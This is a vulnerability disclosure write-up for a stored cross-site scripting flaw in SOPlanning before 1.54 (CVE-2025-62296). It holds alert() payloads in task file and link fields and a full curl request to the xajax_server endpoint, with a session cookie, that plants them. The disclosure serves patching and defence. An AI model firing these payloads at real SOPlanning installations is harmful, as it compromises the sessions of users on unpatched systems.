# (CVE-2025-62296) Stored XSS Task -- Link, Files

## üìù Description
> Cross-Site Scripting (XSS) vulnerability in SOPlanning <1.54, due to lack of proper validation of user input via /soplanning/www/process/xajax_server. This could allow a remote user to send a specially crafted query to an authenticated user.
## üìà CVSS Score
- **Base Score:** 5.1 (Medium)
- **Vector String:** CVSS:3.1AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L
## üß™ Proof of Concept (PoC)
> Click on Planning --> Add Task.
>![[Pasted image 20250724132922.png]]
Then click to save the task and intercept the request and exchange the name of the file to the following:
```
test%22%3E%3Cimg%20src%20onerror%3Dalert(1)%3E
```
The link payload:
```
test"><img src onerror=alert(2)>
```
Curl exploit(Change Hosts and cookie session):
```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: lukasz.soplanning.pro' -H $'Content-Length: 746' -H $'Method: POST ./process/xajax_server HTTP/1.1' -H $'Sec-Ch-Ua-Platform: \"Linux\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Sec-Ch-Ua: \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36' -H $'Accept: */*' -H $'Origin: https://lukasz.soplanning.pro' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://lukasz.soplanning.pro/planning' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=1, i' \
    -b $'baseLigne=users; baseColonne=jours; afficherTableauRecap=1; xposJoursWin=0; yposJoursWin=0; dimensionCase=reduit; date_debut_affiche=22%2F07%2F2025; date_fin_affiche=22%2F09%2F2025; dateDebut=22/07/2025; dateFin=22/09/2025; date_fin_affiche_tache=22%2F09%2F2025; date_debut_affiche_tache=04%2F03%2F2020; statut_projet=%5B%22abort%22%2C%22asd%22%2C%22done%22%2C%22progress%22%2C%22todo%22%5D; xposMoisWin=0; masquerLigneVide=0; sop5834planning_=7qenft4dfioqb2bc55fc85cvvn; yposMoisWin=0; yposTaches=120' \
    --data-binary $'xajax=submitFormPeriode&xajaxr=1753356538490&xajaxargs[]=1485&xajaxargs[]=test3&xajaxargs[]=%3Cxjxobj%3E%3Ce%3E%3Ck%3E0%3C%2Fk%3E%3Cv%3Eaa%3C%2Fv%3E%3C%2Fe%3E%3C%2Fxjxobj%3E&xajaxargs[]=24%2F07%2F2025&xajaxargs[]=false&xajaxargs[]=11%2F09%2F2025&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=false&xajaxargs[]=false&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=1&xajaxargs[]=1&xajaxargs[]=1&xajaxargs[]=1&xajaxargs[]=1&xajaxargs[]=false&xajaxargs[]=todo&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=non&xajaxargs[]=test&xajaxargs[]=test&xajaxargs[]=test%22%3E%3Cimg%20src%20onerror%3Dalert(2)%3E&xajaxargs[]=test&xajaxargs[]=test%22%3E%3Cimg%20src%20onerror%3Dalert(1)%3E&xajaxargs[]=1882861782688217952be2d&xajaxargs[]=true&xajaxargs[]=&xajaxargs[]=true' \
    $'https://lukasz.soplanning.pro/process/xajax_server'
```

Then the XSS executed in following locations:
```
Files payload - edition of the task 
Link payload - https://lukasz.soplanning.pro/taches
```
![[Pasted image 20250724133235.png]]

## üõ†Ô∏è Recommendation / Fix

Sanitize user input.
